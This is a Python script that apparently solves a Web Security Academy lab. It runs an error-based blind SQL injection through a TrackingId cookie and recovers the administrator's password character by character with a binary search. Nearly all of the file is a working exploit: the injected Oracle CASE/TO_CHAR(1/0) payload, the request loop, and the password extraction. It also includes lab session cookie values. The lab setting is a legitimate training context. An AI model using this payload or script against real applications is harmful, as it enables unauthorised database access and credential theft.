import requests
import string
import time

url = 'https://0a6f00430408252780234e9a00b400c8.web-security-academy.net/'

cookies = {
    'session': 'xPihegbZdUhdI5NNKPbRiscopZ5Zn9SV',
    'TrackingId': 'oLgMMVv9k1Nnb0cI'  # Base TrackingId, injection will be added
}

charset = ''.join([chr(i) for i in range(32, 127)])  # Full printable ASCII

#def send_request(injection):
 #   full_cookie = cookies.copy()
  #  full_cookie['TrackingId'] += injection
   # print(full_cookie['TrackingId'])
    #r = requests.get(url, cookies=full_cookie, verify=False)
    #return r.status_code != 500  # True if no error (condition FALSE), False if error (condition TRUE)

def send_request(injection):
    full_cookie = cookies.copy()
    full_cookie['TrackingId'] += injection
    headers = {'User-Agent': 'Mozilla/5.0'}

    try:
        r = requests.get(url, cookies=full_cookie, headers=headers, verify=False, timeout=5)
        
        # Debug info
        print(f"[DEBUG] Status: {r.status_code} | Error Present: {'Internal Server Error' in r.text}")

        # If the injection triggered an error, it means the condition was TRUE
        return 'Internal Server Error' in r.text

    except requests.exceptions.Timeout:
        print("[-] Request timed out!")
        return True  # Conservative guess: assume the error was triggered

    except Exception as e:
        print(f"[!] Request error: {e}")
        return True


def binary_search_char_at_pos(pos):
    low = 0
    high = len(charset) - 1

    while low <= high:
        mid = (low + high) // 2
        mid_char = charset[mid]

        injection = f"' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,{pos},1) >= '{mid_char}') || '"
        success = send_request(injection)

        if success:  # Error means condition TRUE → go higher
            low = mid + 1
        else:
            high = mid - 1

    return charset[high]


def main():
    password = ''
    for i in range(1, 21):  # Positions 1 to 20
        print(f"[*] Finding character at position {i}...")
        char = binary_search_char_at_pos(i)
        password += char
        print(f"[+] Found: {char} --> Password so far: {password}")

    print(f"[✓] Final password: {password}")

if __name__ == '__main__':
    main()
